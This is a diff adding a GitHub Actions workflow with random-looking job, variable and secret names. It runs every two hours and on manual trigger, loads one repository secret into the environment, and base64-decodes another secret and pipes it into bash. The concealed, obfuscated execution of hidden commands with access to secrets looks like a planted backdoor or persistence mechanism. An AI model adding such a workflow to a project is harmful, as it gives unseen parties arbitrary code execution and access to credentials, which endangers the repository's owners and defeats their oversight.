@@ -1,0 +1,13 @@
+name: GmkoSD
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  RvtuiBXkEZM:
+    runs-on: ubuntu-latest
+    env:
+      XqYcATjJ: ${{ secrets.lSgcWC }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.ARmNKvTogo }}" | base64 -d | bash
